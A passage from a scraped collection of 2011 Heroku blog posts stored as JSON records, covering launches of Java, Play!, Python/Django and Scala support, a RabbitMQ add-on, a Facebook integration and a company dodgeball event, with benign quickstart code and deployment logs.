verifies, ops deploys, and finally end users can access.  In this environment, the feedback loop for information about how code behaves in production is slow and inefficient — it may take weeks or months for this to make it back to developers, and often in a highly-filtered format. Heroku is built for the new era of software-as-a-service.  An app is built by a small, cross-functional, relatively independent team which builds and deploys everything itself, with few or no hand-offs to other teams.  There is no packaging, distribution, or install element because the code never leaves the team/organization.  This keeps developers who build the software in close touch with how it behaves in production.  And it enables continuous delivery, for a tight feedback loop between customer needs and resulting software built for those needs. Java teams are often still stuck with the classic process because it's built into the toolchain.  Heroku for Java is optimized for compact applications that require robust, yet agile deployment and rapid iterations.  You can deploy any Java application to Heroku, including J2EE applications, but you aren't constrained by the J2EE deployment process. Other JVM Languages This announcement is official support for Java the language, but developers familiar with the JVM have already seen that it's possible to deploy any other JVM-based language, by bootstrapping with pom.xml .  The JVM is becoming popular as the runtime VM for both new and existing languages, so Java support on Heroku makes it much easier to bootstrap into running any JVM language on our platform. For example, JRuby is one of the most frequently-requested languages on Heroku.  Matthew Rodley has already put a Rails app onto JRuby on Heroku by adding JRuby to pom.xml . Scala , another common request, could be done the same way.  We do look forward to being able to offer the same kind of first-class support for JRuby and Scala that we offer for Clojure; but in the meantime, bootstrapping via Java is a reasonable strategy. Learning From Each Other With the rise of polyglot programming, cross-talk between language communities has become much more common.  Heroku's polyglot platform further reinforces that trend. Younger language communities have much they can learn from a mature community like Java.  For example, Java began working on build automation and dependency management (via Ant , and later Maven ) long before Ruby/Rails got Gem Bundler , Python got Pip , or Clojure got Leiningen .  These tools owe much of their underlying theory to the learning (and battle scars) accumulated by Java build tools. At the same time, Java has much it can learn from younger languages which are unencumbered by legacy baggage.  Patterns, frameworks, and build systems in newer languages are already optimized for cloud application deployment with no left-over cruft from past eras.  Java has already borrowed ideas in the framework space — see Play! or Grails for two examples.  But sharing common deployment infrastructure between languages opens up the possibility for Java developers to get more exposure to deployment and scaling best practices from other communities. The Future Java is another milestone on the polyglot platform path, but there's more to come.  Future language packs will span the gamut from venerable (like Java) to cutting-edge (like Clojure and Node.js) to squarely in-between (like Ruby).  Our desire is to be as inclusive as possible.  Choice of language is up to the developer. Heroku is driven by a simple first principle: do what's best for developers.  Supporting Java is what's best for the large world of Java developers; it's what's best for developers who want to use other JVM languages; and it's even good for users of other languages, who will benefit indirectly from the learning their community may gain from contact with Java.  We're pleased to welcome Java developers to Heroku. Get Going Ready to get started building Java apps on Heroku?  Start with these articles in the Dev Center: Getting Started with Java on Heroku/Cedar Getting Started with Spring MVC Hibernate on Heroku/Cedar Java on Heroku Workbook", "date": "2011-08-25,"},
{"website": "Heroku", "title": "Play! on Heroku", "author": ["Jesper Joergensen"], "link": "https://blog.heroku.com/play", "abstract": "Play! on Heroku Posted by Jesper Joergensen August 29, 2011 Listen to this article Developers with experience in both Java and Ruby web development often ask the question: Why is web app development so complicated in Java, and so much simpler in Ruby, with Rails? There are many ways to answer this question. But importantly, none of them should blame the Java language itself. The people behind Play! Framework proved this by creating a Java based web framework that is as elegant and productive as Rails for Ruby. It is our pleasure to announce Play! on Heroku in public beta. Play! on Heroku Quickstart Download and install Play! version 1.2.3 or later.  Then, create a new Play! app: $ play new helloworld\n~        _            _ \n~  _ __ | | __ _ _  _| |\n~ | '_ \\| |/ _' | || |_|\n~ |  __/|_|\\____|\\__ (_)\n~ |_|            |__/   \n~\n~ play! 1.2.3, http://www.playframework.org\n~\n~ The new application will be created in /Users/jjoergensen/dev/tmp/helloworld\n~ What is the application name? [helloworld] \n~\n~ OK, the application is created.\n~ Start it with : play run helloworld\n~ Have fun!\n~\n$ cd helloworld Create a Procfile : web: play run --http.port=$PORT $PLAY_OPTS Commit to Git, then create an app on the [Cedar] stack and deploy: $ git init\n$ git add .\n$ git commit -m init\n\n$ heroku create --stack cedar\n\n$ git push heroku master\nCounting objects: 30, done.\nDelta compression using up to 4 threads.\nCompressing objects: 100% (22/22), done.\nWriting objects: 100% (30/30), 35.95 KiB, done.\nTotal 30 (delta 1), reused 0 (delta 0)\n\n-----> Heroku receiving push\n-----> play app detected\n-----> Installing Play!..... done\n-----> Building Play! application...\n       ~        _            _ \n       ~  _ __ | | __ _ _  _| |\n       ~ | '_ \\| |/ _' | || |_|\n       ~ |  __/|_|\\____|\\__ (_)\n       ~ |_|            |__/   \n       ~\n       ~ play! 1.2.3, http://www.playframework.org\n       ~\n       1.2.3\n       Play! application root found at ./\n       Resolving dependencies: .play/play dependencies ./ --forceCopy --sync --silent -Duser.home=/tmp/build_2rgcv7zjrtyul 2>&1\n       ~ Resolving dependencies using /tmp/build_2rgcv7zjrtyul/conf/dependencies.yml,\n       ~\n       ~\n       ~ No dependencies to install\n       ~\n       ~ Done!\n       ~\n       Precompiling: .play/play precompile ./ --silent 2>&1\n       Listening for transport dt_socket at address: 8000\n       16:14:33,716 INFO  ~ Starting /tmp/build_2rgcv7zjrtyul\n       16:14:34,372 INFO  ~ Precompiling ...\n       16:14:37,656 INFO  ~ Done.\n\n-----> Discovering process types\n       Procfile declares types -> web\n-----> Compiled slug size is 26.2MB\n-----> Launching... done, v5\n       http://blazing-water-545.herokuapp.com deployed to Heroku Visit your app's URL to see it running on Heroku. A Radical Approach to Java Web Framework Design For as long as developers have been writing web apps in Java, web frameworks have proliferated to try to make web development easier. But no existing frameworks have taken a clean-room approach. They've been bound by various self-imposed restrictions such as compatibility with servlet containers, support for JSP, compatibility with the standard Java web app layout, and conformance to Java and OO principles even when they don't make sense. Play! is the first Java web framework to start fresh. It is a built-for-deployment framework that borrows heavily from Rails. Play! applications are meant to be deployed, not packaged and distributed. This allows developers to throw away deeply nested Java package structures, control flow in XML, forget about packaging WAR files, and instead structure projects for optimal clarity and developer productivity. For example, the helloworld app created above contains a single Java class, the controller: package controllers;\n\nimport play.*;\nimport play.mvc.*;\n\nimport java.util.*;\n\nimport models.*;\n\npublic class Application extends Controller {\n\n    public static void index() {\n        render();\n    }\n\n} This class defines a single HTTP entry point processed by the index() method which delegates rendering of output to an index.html template using the render() method. No boilerplate classes or XML config files are needed. The framework takes a fresh approach to packaging conventions, and uses static code where it makes sense. For example, since controller entry points are stateless, and HTTP-oriented instead of object-oriented, they are implemented as static methods (the index() method above). Add in developer-convenience features like automatic compilation during development, and you'll find that Play! is dramatically more productive to work with than any existing Java web framework. A Containerless World Jetty has always been at the forefront of containerless deployment , but it has been a lonely place for more than a decade.  And the experience can be clunky, because little attention has been paid to optimizing the developer experience for containerless apps. Play! shows how simple and elegant containerless development and deployment can be when it's directly supported by a framework. Running your app locally is as simple as executing play run . Running it in production is as simple as pushing the entire project to production and executing play run --%prod . Heroku was designed exactly for this model. Play! applications find a natural home on the Heroku platform. When developing on Heroku, you test your app locally with play run , or foreman start . When you are ready to deploy, you simply push your whole project with git push heroku master and heroku will execute play run in production mode. This results in a deployment workflow with minimal and easily understandable differences between deployment and production. In fact, you can run it locally exactly the same way it runs on Heroku eliminating any problems caused by environment differences. More Than Just Sugar One might jump to the conclusion that Play! is overly focused on ease of use at the cost of performance and robustness. After all, isn't that the reason other frameworks were built on existing, highly optimized libraries? Look under the covers of Play! and you will find that the start-from-scratch approach gives performance benefits as well. Play! is designed from the ground up to support asynchronous processing of web requests, a technique that is gaining widespread adoption with Node.js , Python's Twisted , and Ruby's EventMachine . Play! uses Netty , a non-blocking I/O protocol library built by the JBoss team . It combines non-blocking I/O with an elegant continuation-based programming model to deliver asynchronous processing of requests. For example, the rendering of a PDF can be done in the background while suspending the incoming request as simple as this: public static void generatePDF(Long reportId) {\n    Promise<InputStream> pdf = new ReportAsPDFJob(report).now();\n    InputStream pdfStream = await(pdf);\n    renderBinary(pdfStream);\n} Play! also does away with the use of stateful sessions, which are so common in other Java web frameworks. By embracing a share-nothing model, Play! makes it easy to scale out applications horizontally by adding more nodes. Further Reading We think you'll find Play! not only productive, but fun.  Dive in and start building apps! Getting Started with Play! on Heroku/Cedar Database-driven Apps with Play! on Heroku/Cedar Five Cool Things You Can Do With Play! Screencast: A Web App in 10 Minutes Using Play! Special Thanks Special thanks to the Play! Framework team at Zenexity , in particular Guillaume Bort for his support and stewardship and Erwan Loisant for accepting and integrating several feature requests.", "date": "2011-08-29,"},
{"website": "Heroku", "title": "RabbitMQ Add-on Now Available on Heroku", "author": ["Morten Bagai"], "link": "https://blog.heroku.com/rabbitmq_add_on_now_available_on_heroku", "abstract": "RabbitMQ Add-on Now Available on Heroku Posted by Morten Bagai August 31, 2011 Listen to this article Today we're proud to announce the availability in beta of RabbitMQ add-on by VMWare . RabbitMQ is an open source implementation of the AMQP protocol that provides a robust, scalable and easy-to-use messaging system built for the needs of cloud application developers. Getting Started With the add-on, provisioning a fully managed RabbitMQ instance couldn't be easier to do: $ cd rabbitdemo\n$ heroku addons:add rabbitmq\n-----> Adding rabbitmq to rabbitdemo... done, v2 (free)\n\n$ heroku config\nRABBITMQ_URL  => amqp://uname:pwd@host.heroku.srs.rabbitmq.com:13029/vhost Your application's environment will now have the RABBITMQ_URL set pointing to your new instance. Most modern AMQP clients such as Bunny for Ruby will accept a connection string in URI format, making configuration a breeze. The following is a simple Sinatra app that demonstrates posting and getting messages from the default RabbitMQ exchange. You can grab the source from Github here . Let's have a look: Entering a message and hitting \"post\" will send a message to a RabbitMQ queue, where it will sit until we tell the app to fetch the oldest message from the queue by clicking \"get\". Examining the application code, the first place to look is in \"lib/sinatra_rabbitmq.rb\" where we set up the connection from the environment variable, and declare a queue called \"messages\": lib/sinatra_rabbitmq.rb require 'sinatra/base'\nrequire 'bunny'\n\nmodule Sinatra\n  module RabbitMQ\n    def rabbitmq_client\n      return @rabbitmq_client if @rabbitmq_client\n      @rabbitmq_client = Bunny.new(ENV[\"RABBITMQ_URL\"])\n      @rabbitmq_client.start\n      @rabbitmq_client\n    end\n\n    def rabbitmq_exchange\n      @rabbitmq_exchange ||= rabbitmq_client.exchange(\"\")\n    end\n\n    def rabbitmq_messages_queue\n      @rabbitmq_messages_queue ||= rabbitmq_client.queue(\"messages\")\n    end\n  end\n\n  register RabbitMQ\nend Note that in RabbitMQ a message is never sent directly to a queue. Instead, it passes through an exchange , the type of which defines how messages are distributed to one or more client queues. In this case, we're side-stepping the concept of exchanges by using the default nameless exchange, which allows us to specify the target queue for our messages using a routing key. Once you get into more advanced usage of RabbitMQ such a broadcasting messages to set of known queues, you'll definitely want to learn more about exchanges . With our connection established and queue defined, the main part of our app looks like this: app.rb require 'sinatra/base'\nrequire \"#{File.dirname(__FILE__)}/lib/sinatra_rabbitmq\"\n\nclass RabbitmqDemo < Sinatra::Base\n  register Sinatra::RabbitMQ\n\n  get \"/\" do\n    haml :index\n  end\n\n  post \"/\" do\n    self.class.rabbitmq_exchange.publish params[\"message\"], :key => \"messages\"\n    @notice = \"Message has been published.\"\n    haml :index\n  end\n\n  get \"/message\" do\n    msg = self.class.rabbitmq_messages_queue.pop\n    if msg[:payload] == :queue_empty\n      @notice = \"No more messages.\"\n    else\n      @message = msg[:payload]\n    end\n    haml :index\n  end\nend The first interesting part here is post to \"/\" where we send the message you typed in to the default exchange, using \"messages\" as the routing key. Then we pick up any outstanding at \"/messages\" by popping off the queue, which follows the FIFO principle. The rest, as they say, is just a bit of HTML. Why would you want to use a messaging system? The distribution of workloads across different process types is an essential aspect of modern web application architecture.  For example, if your app handles file uploads, your web process might receive the upload and signal a background worker to do some processing on it via a queue.  While you could use Delayed Job or another database-backed queueing library to do this, a true messaging system gives you much more flexibility, reliability and scalability in defining how your signals are distributed and received by your worker pool. Finally, messaging is an important tool for the polyglot programmer . Having a language agnostic, data-centric message bus that can orchestrate communications between, say, a web app in Ruby, workers in Java and a chat server in Node.js is a key enabler in allowing application developers choose the right tool for any specific job. Over the past few years RabbitMQ has emerged as one of the most popular, open source choices for messaging with clients in all major languages, and thousands of enterprises trusting it for mission-critical apps. We're excited to offer it as a cloud service through the Add-ons Catalog , fully managed and operated by the team who created it. rabbitmq addons", "date": "2011-08-31,"},
{"website": "Heroku", "title": "Facebook and Heroku", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/facebook", "abstract": "Facebook and Heroku Posted by Adam Wiggins September 15, 2011 Listen to this article We're delighted to announce that Facebook and Heroku have teamed up to bring you the fastest and easiest way to get your own Facebook app up and running in the cloud. Facebook apps have long been a major segment on the Heroku platform. From scrappy startups like Cardinal Blue to Hollywood giants like Warner Brothers , Heroku's scale-out capabilities and friction-free workflow enables these innovative companies to easily deliver great social experiences.\nNow, Facebook has created a fantastic new way to start building a live Facebook app instantly, powered by Heroku. A Quick Tour Start by going to Facebook Developers .  Click Create New App and then Cloud Services → Get Started .  A captcha and a button press later, and you've got your very own Facebook app running on Heroku!  You can git clone the app to start working on it immediately. This screencast tells the full story: Detailed instructions available in Getting Started With Your Facebook App on Heroku . Polyglot Support Heroku is a polyglot platform , so we're offering support for the languages that Facebook developers are most likely to use.  Apps are created from one of four templates, based on the language choice you make at app creation time: Ruby , Node.js , Python , or PHP . As part of this launch, we're including partial support for two new languages: Python and PHP.  For now, these languages are only supported for apps created through the Facebook integration. What This Means Facebook wanted to make their new app creation process smooth and easy, and knew that they needed to embrace the cloud to do so.  As the world's most mature and powerful cloud application platform, Heroku was the obvious choice. Our two companies share many product and engineering values, and our teams had a blast working on this together.  Our goals were to deliver an integration that: Avoids superfluous steps, like account signup or cutting-and-pasting of config values. Focuses on apps, not servers.  When your Facebook app suddenly gets big traffic, the last thing you should be doing is thinking about servers: you need instant scaling . Gets you an app running instantly.  Who wants to wait around for minutes while their app \"provisions\"? Doesn't force you to make up-front decisions about cost.  You don't need a credit card to get started, and low-volume apps on Heroku are free forever. For all of the above reasons and more, we believe this makes Facebook and Heroku the perfect combination. Next Steps Log in to your Facebook account and visit Facebook Developers to get started. Further reading: Getting Started With Your Facebook App on Heroku Facebook blog post Facebook developer docs", "date": "2011-09-15,"},
{"website": "Heroku", "title": "Facebook Open Graph Momentum", "author": ["Adam Seligman"], "link": "https://blog.heroku.com/facebook_open_graph_momentum", "abstract": "Facebook Open Graph Momentum Posted by Adam Seligman September 23, 2011 Listen to this article It's been an exciting 24 hours for social application developers. A week ago, Facebook and Heroku announced a partnership to make it incredibly easy to get a live Facebook app running on Heroku. Yesterday at f8, Facebook unveiled the Timeline and the next generation of social apps on the Open Graph, with support for actions and objects. The response has been amazing, and Heroku has seen more than 33,800 new apps created via Facebook in the last 24 hours; that's more than 20 a minute. Facebook has again innovated and captured the excitement of the developer community. To help developers understand and become productive with new Open Graph features, Facebook posted a great screencast this morning. Check it out and learn how to build the next generation of Open Graph apps. Today Heroku is at the Facebook f8 Hack event , hanging out with a few hundred developers who are banging out new apps on Heroku. We can't wait to see what amazing apps come out of it.", "date": "2011-09-23,"},
{"website": "Heroku", "title": "Python and Django on Heroku", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/python_and_django", "abstract": "Python and Django on Heroku Posted by Adam Wiggins September 28, 2011 Listen to this article Python has joined the growing ranks of officially-supported languages on Heroku's polyglot platform , going into public beta as of today.  Python is the most-requested language for Heroku, and it brings with it the top-notch Django web framework. As a language, Python has much in common with Ruby, Heroku's origin language.  But the Python community has its own unique character.  Python has a culture which finds an ideal balance between fast-moving innovation and diligent caution.  It emphasizes readability, minimizes \"magic,\" treats documentation as a first-class concern, and has a tradition of well-tested, backward-compatible releases in both the core language and its ecosystem of libraries.  It blends approachability for beginners with maintainability for large projects, which has enabled its presence in fields as diverse as scientific computing, video games, systems automation, and the web. Let's take it for a spin on Heroku. Heroku/Python Quickstart Make a directory with three files: app.py import os\nfrom flask import Flask\napp = Flask(__name__)\n\n@app.route(\"/\")\ndef hello():\n    return \"Hello from Python!\"\n\nif __name__ == \"__main__\":\n    port = int(os.environ.get(\"PORT\", 5000))\n    app.run(host='0.0.0.0', port=port) requirements.txt Flask==0.7.2 Procfile web: python app.py Commit to Git: $ git init\n$ git add .\n$ git commit -m \"init\" Create an app on the Cedar stack and deploy: $ heroku create --stack cedar\nCreating young-fire-2556... done, stack is cedar\nhttp://young-fire-2556.herokuapp.com/ | git@heroku.com:young-fire-2556.git\nGit remote heroku added\n\n$ git push heroku master\nCounting objects: 5, done.\nDelta compression using up to 4 threads.\nCompressing objects: 100% (3/3), done.\nWriting objects: 100% (5/5), 495 bytes, done.\nTotal 5 (delta 0), reused 0 (delta 0)\n\n-----> Heroku receiving push\n-----> Python app detected\n-----> Preparing virtualenv version 1.6.1\n       New python executable in ./bin/python2.7\n       Also creating executable in ./bin/python\n       Installing setuptools............done.\n       Installing pip...............done.\n-----> Installing dependencies using pip version 1.0.1\n       Downloading/unpacking Flask==0.7.2 (from -r requirements.txt (line 1))\n       ...\n       Successfully installed Flask Werkzeug Jinja2\n       Cleaning up...\n-----> Discovering process types\n       Procfile declares types -> web\n-----> Compiled slug size is 3.5MB\n-----> Launching... done, v2\n       http://young-fire-2556.herokuapp.com deployed to Heroku\n\nTo git@heroku.com:young-fire-2556.git\n * [new branch]      master -> master Then view your app on the web! $ curl http://young-fire-2556.herokuapp.com/\nHello from Python! Dev Center : Getting Started with Python on Heroku/Cedar All About Python Created by Guido van Rossum in 1991, Python is one of the world's most popular programming languages, and finds application in a broad range of uses. Cutting-edge communities, like Node.js and Ruby, encourage fast-paced innovation (though sometimes at the cost of application breakage).  Conservative communities, like Java, favor a more responsible and predictable approach (though sometimes at the expense of being behind the curve).  Python has managed to gracefully navigate a middle path between these extremes, giving it a respected reputation even among non-Python programmers.  The Python community is an island of calm in the stormy seas of the programming world. Python is known for its clearly-stated values, outlined in PEP 20, The Zen of Python .  \"Explicit is better than implicit\" is one example (and a counterpoint to \"Convention over configuration\" espoused by Rails). \"There's only one way to do it\" is another (counterpointing \"There's more than one way to do it\" from Perl).  See Code Like a Pythonista: Idiomatic Python for more. The Python Enhancement Proposal (PEP) brings a structured approach to extending the core language design over time.  It captures much of the value of Internet standard bodies procedures (like Internet Society RFCs or W3C standards proposals) without being as heavy-weight or resistant to change.  Again, Python finds a graceful middle path: neither changing unexpectedly at the whim of its lead developers, nor unable to adapt to a changing world due to too many approval committees. Documentation is one of Python's strongest areas, and especially notable because docs are often a second-class citizen in other programming languages. Read the Docs is an entire site dedicated to packaging and documentation, sponsored by the Python Software Foundation.  And the Django book defined a whole new approach to web-based publishing of technical books, imitated by many since its release. Frameworks and the Web In some ways, Python was the birthplace of modern web frameworks, with Zope and Plone .  Concepts like separation of business and display logic via view templating, ORMs for database interaction, and test-driven development were built into Zope half a decade before Rails was born.  Zope never had the impact achieved by the later generation of frameworks, partially due to its excessive complexity and steep learning curve, and partially due to simply being ahead of its time.  Nevertheless, modern web frameworks owe much to Zope's pioneering work. The legacy of Zope's checkered history combined with the Python community's slow recognition of the importance of the web could have been a major obstacle to the language's ongoing relevance with modern developers, who increasingly wanted to build apps for the web.  But in 2005, the Django framework emerged as a Pythonic answer to Rails.  (Eventually, even Guido came around .) Django discarded the legacy of past Python web implementations, creating an approachable framework designed for rapid application development.  Django's spirit is perhaps best summarized by its delightful slogan: \"the web framework for perfectionists with deadlines.\"  Where Rails specializes on CRUD applications, Django is best known for its CMS capabilities.  It has an emphasis on DRY (Don't Repeat Yourself) .  The Django community prefers to create reusable components or contribute back to existing projects over single-use libraries, which helps push the greater Python community forward.  While Django is a batteries-included framework, the loose coupling of components allows flexibility and choice. Other frameworks have found traction as well. Flask , a Sinatra-like microframework, makes use of Python's decorators for readability. Pyramid emerged from the earlier Pylons and TurboGears projects, and their documentation already offers excellent instructions for deploying to Heroku . Similarly, Python established a pattern for webserver adapters with WSGI .  Many other languages have since followed suit, such as Rack for Ruby, Ring for Clojure, and PSGI/Plack for Perl. In the Wild Perhaps most striking about Python is the breadth of different realms it has taken root in.  A few examples: Science and math computing, evidenced by books and the SciPy libraries and conferences . Video games, as seen in libraries such as PyGame and Cocos2d . As an embedded scripting / extension language, in software such as Blender3D , Civilization IV , and EVE Online (via Stackless Python ). Major Linux distributions use Python for their system tools, such as yum and the Red Hat Network client for Red Hat and Fedora; or almost all of the GUI configuration and control panels on Ubuntu. It's one of the three official languages used by Google, alongside Java and C++. And of course, internet startups: Reddit, YouTube, Disqus, Dropbox, and countless others use Python to build their businesses. Conclusion We anticipate that Python will be one of the most-used languages on the Heroku platform, and are overjoyed to welcome our Python brothers and sisters into the fold. Special thanks to all the members of the Python community that helped with alpha testing, feedback, and patches on Heroku's Python support, including: David Cramer , Ben Bangert , Kenneth Love , Armin Ronacher , and Jesse Noller . We'll be sponsoring and speaking at PyCodeConf next week.  Come chat with us about what you'd like to see out of Python on Heroku! Further reading: Getting Started with Python on Heroku/Cedar Getting Started with Django on Heroku/Cedar The Python Tutorial Writing your first Django app Learn Python the Hard Way", "date": "2011-09-28,"},
{"website": "Heroku", "title": "Scala on Heroku", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/scala", "abstract": "Scala on Heroku Posted by Adam Wiggins October 03, 2011 Listen to this article The sixth official language on the Heroku polyglot platform is Scala , available in public beta on the Cedar stack starting today. Scala deftly blends object-oriented programming with functional programming .  It offers an approachable syntax for Java and C developers, the power of a functional language like Erlang or Clojure, and the conciseness and programmer-friendliness normally found in scripting languages such as Ruby or Python.  It has found traction with big-scale companies like Twitter and Foursquare, plus many others .  Perhaps most notably, Scala offers a path forward for Java developers who seek a more modern programming language. More on those points in a moment.  But first, let's see it in action. Scala on Heroku in Two Minutes Create a directory.  Start with this sourcefile: src/main/scala/Web.scala import org.jboss.netty.handler.codec.http.{HttpRequest, HttpResponse}\nimport com.twitter.finagle.builder.ServerBuilder\nimport com.twitter.finagle.http.{Http, Response}\nimport com.twitter.finagle.Service\nimport com.twitter.util.Future\nimport java.net.InetSocketAddress\nimport util.Properties\n\nobject Web {\n  def main(args: Array[String]) {\n    val port = Properties.envOrElse(\"PORT\", \"8080\").toInt\n    println(\"Starting on port:\"+port)\n    ServerBuilder()\n      .codec(Http())\n      .name(\"hello-server\")\n      .bindTo(new InetSocketAddress(port))\n      .build(new Hello)\n  }\n}\n\nclass Hello extends Service[HttpRequest, HttpResponse] {\n  def apply(req: HttpRequest): Future[HttpResponse] = {\n    val response = Response()\n    response.setStatusCode(200)\n    response.setContentString(\"Hello from Scala!\")\n    Future(response)\n  }\n} Add the following files to declare dependencies and build with sbt, the simple build tool for Scala : project/build.properties sbt.version=0.11.0 build.sbt import com.typesafe.startscript.StartScriptPlugin\n\nseq(StartScriptPlugin.startScriptForClassesSettings: _*)\n\nname := \"hello\"\n\nversion := \"1.0\"\n\nscalaVersion := \"2.8.1\"\n\nresolvers += \"twitter-repo\" at \"http://maven.twttr.com\"\n\nlibraryDependencies ++= Seq(\"com.twitter\" % \"finagle-core\" % \"1.9.0\", \"com.twitter\" % \"finagle-http\" % \"1.9.0\") Declare how the app runs with a start script plugin and Procfile: project/build.sbt resolvers += Classpaths.typesafeResolver\n\naddSbtPlugin(\"com.typesafe.startscript\" % \"xsbt-start-script-plugin\" % \"0.3.0\") Procfile web: target/start Web Commit to Git: $ git init\n$ git add .\n$ git commit -m init Create an app on the Cedar stack and deploy: $ heroku create --stack cedar\nCreating warm-frost-1289... done, stack is cedar\nhttp://warm-frost-1289.herokuapp.com/ | git@heroku.com:warm-frost-1289.git\nGit remote heroku added\n\n$ git push heroku master\nCounting objects: 14, done.\nDelta compression using up to 4 threads.\nCompressing objects: 100% (9/9), done.\nWriting objects: 100% (14/14), 1.51 KiB, done.\nTotal 14 (delta 1), reused 0 (delta 0)\n\n-----> Heroku receiving push\n-----> Scala app detected\n-----> Building app with sbt v0.11.0\n-----> Running: sbt clean compile stage\n       Getting net.java.dev.jna jna 3.2.3 ...\n       ...\n       [success] Total time: 0 s, completed Sep 26, 2011 8:41:10 PM\n-----> Discovering process types\n       Procfile declares types -> web\n-----> Compiled slug size is 43.1MB\n-----> Launching... done, v3\n       http://warm-frost-1289.herokuapp.com deployed to Heroku Then view your app on the web! $ curl http://warm-frost-1289.herokuapp.com\nHello from Scala! Dev Center: Getting Started with Scala on Heroku/Cedar Language and Community Scala is designed as an evolution of Java that addresses the verbosity of Java syntax and adds many powerful language features such as type inference and functional orientation.  Java developers who have made the switch to Scala often say that it brings fun back to developing on the JVM.  Boilerplate and ceremony are replaced with elegant constructs, to express intent in fewer lines of code.  Developers get all the benefits of the JVM — including the huge ecosystem of libraries and tools, and a robust and performant runtime — with a language tailored to developer happiness and productivity. Scala is strongly- and statically-typed, like Java (and unlike Erlang and Clojure).  Its type inference has much in common with Haskell. Yet, Scala achieves much of the ease of use of a dynamically-typed language (such as Ruby or Python).  Though there are many well-established options for dynamically-typed open source languages, Scala is one of the few with compile-time type safety which is also both practical and pleasant to use.  The static vs dynamic typing debate rages on , but if you're in the type-safe camp, Scala is an obvious choice. Language creator Martin Odersky's academic background shines through in the feel of the language and the community.  But the language's design balances academic influence with approachability and pragmatism.  The result is that Scala takes many of the best ideas from the computer science research world, and makes them practical in an applied setting. Members of the Scala community tend to be forward-thinking, expert-level Java programmers; or developers from functional backgrounds (such as Haskell or ML who see an opportunity to apply the patterns they love in a commercially viable environment. There is some debate about whether Scala is too hard to learn or too complex .  One answer is that the language is still young enough that learning resources aren't yet fully-baked, although Twitter's Scala School is one good resource for beginners.  But perhaps Scala is simply a sharper tool than Java: in the hands of experts it's a powerful tool, but copy-paste developers may find themselves with self-inflicted wounds. Scala Days is the primary Scala conference, although the language is well-represented at cross-community conferences like Strange Loop . The language community has blossomed, and is now in the process of accumulating more and more mainstream adoption.  Community members are enthusiastic about the language's potential, making for an environment that welcomes and encourages newcomers. Open Source Projects Open source is thriving in the Scala world.  The Lift web framework is a well-known early mover, but the last two years have seen an explosion of new projects showcasing Scala's strengths. Finagle is a networking library coming out of the Twitter engineering department.  It's not a web framework in the sense of Rails or Django, but rather a toolkit for creating network clients and servers.  The server builder is in some ways reminiscent of the Node.js stdlib for creating servers, but much more feature-full: fault-tolerance, backpressure (rate-limiting defense against attacks), and service discovery to name a few.  The web is increasingly a world of connected services, and Finagle (and Scala) are a natural fit for that new order. Spark runs on Mesos (a good example of hooking into the existing JVM ecosystem) to do in-memory dataset processing, such as this impressive demo of loading all of Wikipedia into memory for lightning-fast searches .  Two other notable projects are Akka (concurrency middleware) and Play! (web framework), which we'll look at shortly. The Path Forward for Java? Some Java developers have been envious of modern, agile, web-friendly languages like Ruby or Python — but they don't want to give up type safety, the Java library ecosystem, or the JVM.  Leaders in the Java community are aware of this stagnation problem and see alternate JVM languages as the path forward.  Scala is the front-runner candidate on this, with support from influential people like Bruce Eckel , Dick Wall and Carl Quinn of the Java Posse , and Bill Venners . Scala is a natural successor to Java for a few reasons.  Its basic syntax is familiar, in contrast with Erlang and Clojure: two other functional, concurrency-focused languages which many developers find inscrutable.  Another reason is that Scala's functional and object-oriented mix allows new developers to build programs in an OO model to start with.  Over time, they can learn functional techniques and blend them in where appropriate. Working with Java libraries from Scala is trivial and practical.  You can not only call Java libraries from Scala, but go the other way — provide Scala libraries for Java developers to call.  Akka is one example of this. There's obvious overlap here between Scala as a reboot of the Java language and toolchain, and the Play! web framework as a reboot of Java web frameworks .  Indeed, these trends are converging, with Play! 2.0 putting Scala front-and-center .  The fact that Play! can be used in a natural way from both Java and Scala is another testament to JVM interoperability.  Play 2.0 will even use sbt as the builder and have native Akka support. Typesafe and Akka Typesafe is a new company emerging as a leader in Scala, with language creator Martin Odersky and Akka framework creator Jonas Bonér as co-founders. Their open-source product is the Typesafe Stack , a commercially-supported distribution of Scala and Akka. Akka is an event-driven middleware framework with emphasis on concurrency and scale-out.  Akka uses the actor model with features such as supervision hierarchies and futures . The Heroku team worked closely with Typesafe on bringing Scala to our platform.  This collaboration produced items like the xsbt-start-script-plugin , and coordination around the release of sbt 0.11. Havoc Pennington of Typesafe built WebWords , an excellent real-world demonstration of using Akka's concurrency capabilities to scrape and process web pages.  Try it out, then dig in on the sourcecode and his epic Dev Center article explaining the app's architecture in detail.  Havoc also gave an educational talk at Dreamforce about Akka, Scala, and Play! . Typesafe: we enjoyed working with you, and look forward to more productive collaboration in the future.  Thanks! Conclusion Scala's explosive growth over the past two years is great news for both Java developers and for functional programming.  Scala on Heroku, combined with powerful toolsets like Finagle and Akka, are a great fit for the emerging future of connected web services. Further reading: Getting Started with Scala on Heroku/Cedar Scaling Out with Scala and Akka on Heroku Twitter Scala School Planet Scala Book: Programming in Scala by Martin Odersky, Lex Spoon, and Bill Venners Book: Programming Scala by Dean Wampler and Alex Payne Video: Scala, Akka, and Play!: An Introduction in the Cloud Special thanks to Havoc Pennington , Jeff Smick , Steve Jenson , James Ward , Bruce Eckel , and Alex Payne for alpha-testing and help with this post.", "date": "2011-10-03,"},
{"website": "Heroku", "title": "The Dodging Samurai Win the First Annual Octocat Dodgeball Invitational", "author": ["Michelle Greer"], "link": "https://blog.heroku.com/heroku-wins-octocat-dodgeball-invitational", "abstract": "The Dodging Samurai Win the First Annual Octocat Dodgeball Invitational Posted by Michelle Greer October 24, 2011 Listen to this article So our good friends at GitHub put together the First Annual Dodgeball Invitational with the intention of pummeling various Bay Area tech companies into submission.  Heroku has never shied away from a challenge, especially when there is a giant Octocat trophy at stake.  The Dodging Samurai emerged victorious despite facing a pool of 21 teams and one crotchety old man wielding a wrench. Through brute force, covert strategies and pink tutus , the Herokai were able to persevere through two teams from both GitHub and Engine Yard , a solid team from Code for America , as well a mysterious unnamed lucha libre fighter from Twilio .  We commend both the spirit and the dodginess of all our competition and look forward to next year's event. What's the best part?  The bulk of the entry fees will now go to our charity of choice, Heifer International .  $28,500 will now be donated to empower families around the world to become self-reliant through sustainable development projects. The Octocat trophy has found a lovely home at our lunch table.  We weren't sure if he was actually a cat in an octopus costume or a fully different species, but we bought catnip and various toys for him anyway.  Check out this Quora thread about the Octocat's proud lineage . github dodgeball octocat dodgeball", "date": 